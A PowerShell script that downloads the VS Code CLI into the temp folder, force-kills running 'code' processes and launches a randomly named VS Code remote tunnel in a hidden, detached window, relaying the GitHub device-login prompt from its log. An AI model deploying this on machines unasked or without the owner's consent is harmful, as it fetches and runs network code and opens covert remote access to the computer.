$url = "https://vscode.download.prss.microsoft.com/dbazure/download/stable/c9d77990917f3102ada88be140d28b038d1dd7c7/vscode_cli_win32_x64_cli.zip"
$tempDir = $env:tmp
$tunzip = Join-Path $tempDir "tun.zip"
$tun = Join-Path $tempDir "code.exe"
$argsRunTunnel = "tunnel --random-name --accept-server-license-terms"
$argsShowLoginStatus = "tunnel user show"
$argsLoginGithub = "tunnel user login --provider github"
$logFile = Join-Path $tempDir "output.log"

function Get-LoginStatus {
    Write-Host "[I]Loinstatus called"
    if (-not(Test-Path -Path $tun -ErrorAction SilentlyContinue)){
        return $false
    }
    $pr = New-Object System.Diagnostics.ProcessStartInfo
    $pr.FileName = $tun
    $pr.Arguments = $argsShowLoginStatus
    $pr.UseShellExecute = $false
    $pr.RedirectStandardOutput = $true
    $pr.RedirectStandardError = $true
    $process = [System.Diagnostics.Process]::Start($pr)
    $process.WaitForExit()
    $statusOutput = $process.StandardOutput.ReadToEnd()
    $errors = $process.StandardError.ReadToEnd()
    Write-Host "The status : $statusOutput"
    if ($statusOutput -match "GitHub"){
        return $true
    }
    return $false

}
# Function to start the process detached
function Start-DetachedTunnel {
    # Kill existing process if running to avoid log locks
    Get-Process -Name "code" -ErrorAction SilentlyContinue | Stop-Process -Force
    if (Test-Path $logFile) { Remove-Item $logFile -Force }
    $arguments = $argsRunTunnel
    if (-not(Get-LoginStatus)){
        Write-Host "[I]Not Logined"
        $arguments = $argsLoginGithub
    }
    Start-Process "cmd.exe" -ArgumentList "/c start /b `"`" `"$tun`" $arguments > `"$logFile`" 2>&1" -WindowStyle Hidden
}

# 2. Deployment
if (-not (Test-Path $tun)) {
    Invoke-WebRequest -Uri $url -OutFile $tunzip
    Expand-Archive -Path $tunzip -DestinationPath $tempDir -Force
    Remove-Item $tunzip -Force
}

# Check if log exists or has errors, then start
if (-not (Test-Path $logFile)) {
    Start-DetachedTunnel
} else {
    $content = Get-Content -Path $logFile -Tail 7 -ErrorAction SilentlyContinue
    if (($content -match "error|warn") -or (-not (Get-Process -Name "code" -ErrorAction SilentlyContinue))) {
        Write-Host "code exe not found or content has error"
        Start-DetachedTunnel
    } 
}
$startTime = Get-Date
while (((Get-Date) - $startTime).TotalSeconds -lt 60) {
    if (Test-Path $logFile) {
        try {
            # Open with ReadWrite sharing to allow the process to keep writing while we read
            #$file = [System.IO.File]::Open($logFile, 'Open', 'Read', 'ReadWrite')
            #$reader = New-Object System.IO.StreamReader($file)
            #$content = $reader.ReadToEnd()
            #$reader.Close(); $file.Close()
            $content = Get-Content -Path $logFile -Tail 7 -ErrorAction SilentlyContinue

            if ($content -match "browser|grant") {
                Write-Host $content
                exit 0
            } else {Write-Host $content}
        } catch {
            # Occasional lock contention
        }
    }

    Write-Host "." -NoNewline
    Start-Sleep -Seconds 1

}

